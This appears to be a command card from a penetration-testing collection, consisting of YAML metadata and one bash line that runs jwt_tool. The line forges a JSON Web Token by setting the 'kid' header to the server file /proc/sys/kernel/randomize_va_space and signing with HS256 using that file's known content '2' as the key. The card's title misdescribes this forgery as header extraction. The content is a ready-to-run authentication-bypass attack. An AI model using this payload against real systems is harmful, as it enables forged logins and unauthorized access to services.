---
id: d745ca2f-7ab4-487b-acfb-133c898b630f
name: Extract JWT header with kid
type: command
executor: bash
data: python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space"
  -S hs256 -p "2"
output: null
created_at: '2023-04-06T03:56:00.787333+00:00'
updated_at: '2023-04-10T20:22:34.479056+00:00'
---

# Extract JWT header with kid

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```


